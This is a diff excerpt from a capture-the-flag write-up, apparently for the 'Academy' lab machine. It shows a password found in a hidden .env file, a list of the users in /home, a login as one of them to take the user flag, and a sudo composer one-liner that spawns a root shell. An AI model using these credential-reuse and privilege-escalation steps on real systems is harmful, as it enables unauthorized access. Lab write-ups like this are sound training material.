@@ -55,6 +55,15 @@ User1
 Using the recursive grep command in the web-app directory to find some passwords didn't give any results, but there are some hidden files in directory so we can check it and find some password in .env file  
 ![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/env%20pas.PNG)
 
+There are several users on the system
+```
+www-data@academy$ ls /home/
+ls /home/
+21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n
+```
+Login attempt with the cry0l1t3 user was successed and we got the user.txt flag
+![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/user%20flag.PNG)
+
 TF=$(mktemp -d)
 echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
 sudo composer --working-dir=$TF run-script x
